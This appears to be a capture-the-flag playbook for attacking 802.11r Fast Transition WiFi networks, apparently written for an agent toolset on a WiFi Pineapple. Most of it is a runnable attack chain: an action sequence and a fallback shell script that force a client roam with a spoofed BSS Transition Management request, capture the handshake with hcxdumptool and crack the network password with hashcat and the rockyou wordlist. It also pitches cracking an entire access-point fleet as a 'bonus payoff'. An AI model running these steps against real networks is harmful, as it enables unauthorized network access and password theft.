# FT-handshake flag — 802.11r roam, crack with hashcat 22000

**Verified against:** hashcat 6.2.x / hcxdumptool 7.3 as of 2026-Q3

Capture an 802.11r Fast Transition reassociation. Convert. Crack.

## Recognition

Beacon carries a Mobility Domain Element (MDE, IE 54, 3 bytes:
2-byte MD ID + 1-byte FT capability). Extended Capabilities IE shows
Fast BSS Transition support bit set. Multiple BSSIDs on the same ESSID
share the MD ID.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "5", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},

    # 1. Force a BTM roam or wait for natural roam.
    {"action": "btm_forced_roam",
     "target_bssid": "AA:BB:CC:DD:EE:FF",   # current AP
     "candidate_bssid": "AA:BB:CC:DD:EE:00", # destination AP
     "client": "11:22:33:44:55:66"},

    # 2. Capture on the destination AP's channel.
    {"action": "capture_ft_handshake",
     "dest_bssid": "AA:BB:CC:DD:EE:00",
     "client": "11:22:33:44:55:66",
     "timeout_s": 60},

    # 3. Convert — hcxpcapngtool handles FT frames as
    #    WPA*02 with the FT-derived MIC.
    {"action": "convert_to_hashcat",
     "mode": 22000,
     "pcap_path": "/tmp/ft.pcapng",
     "out_path": "/tmp/ft.22000"},

    {"action": "crack_start",
     "hash_path": "/tmp/ft.22000",
     "wordlist_path": "/opt/wordlists/rockyou.txt",
     "rules": ["best64.rule"],
     "mode": 22000},
])
```

## MCP mapping / fallback

- `btm_forced_roam` and `capture_ft_handshake` are **not in `src/`**.
  Drive `hostapd_cli` on the Pineapple for BTM Requests, and
  `hcxdumptool`/`tcpdump` on the destination channel for the reassoc
  capture.
- `convert_to_hashcat` → `server.convert_to_hashcat` (works on FT
  reassoc frames — hcxpcapngtool tags them as WPA*02 FT).
- `crack_start` → `server.crack_start`.

**Fallback shell chain — BTM-forced FT capture:**

```bash
# 1. BTM Request via hostapd_cli (only works if you already run hostapd
#    on the same channel with wnm_bss_transition=1). Alternative: send
#    a raw BTM Request with scapy — see references/framing/btm-request.py.
sudo hostapd_cli bss_tm_req 11:22:33:44:55:66 \
    pref=1 abridged=1 disassoc_imminent=1 disassoc_timer=100 \
    neighbor=AA:BB:CC:DD:EE:00,0,11,36,7

# 2. Sit on the destination AP's channel and capture the FT reassoc.
sudo hcxdumptool -i wlan1 -c 36 -w /tmp/ft.pcapng \
    --disable_deauthentication=1
# ...stop after the reassoc lands...

# 3. Convert + crack.
hcxpcapngtool -o /tmp/ft.22000 /tmp/ft.pcapng
hashcat -m 22000 /tmp/ft.22000 /opt/wordlists/rockyou.txt -r best64.rule
```

## The flag surface

Same as any WPA2/3 PSK crack — the recovered PSK is the flag, or the
data-frame decrypt yields it. FT-derived material cracks with the
*same* PSK the AP uses for regular 4-way, because the PMK-R0 root is
derived from the same passphrase.

## The bonus payoff — R0 shared across a fleet

If two APs on the same Mobility Domain use the same PMK-R0-Key-Holder
identifier, cracking the PSK compromises the whole fleet on that MD.
See `ft-r0-shared-fleet-crack`.

## Failure modes

- **No MDE in beacon.** Not an 802.11r deployment. Regular 4-way
  capture applies (`wpa2-crack-flags`).
- **Client refuses BTM roam.** Not BTM-capable, or the BTM Request
  was malformed. Wait for a natural roam.
- **Capture on wrong channel.** FT reassoc frames land on the
  *destination* AP's channel, not the source's. Set your radio to
  the destination channel before firing BTM.

## Cite

- attacks.json: `ft-handshake-capture`, `ft-r0-shared-fleet-crack`,
  `btm-forced-roam`, `neighbor-report-spoof`.
- IEEE Std 802.11-2020, §12.11 (FT).
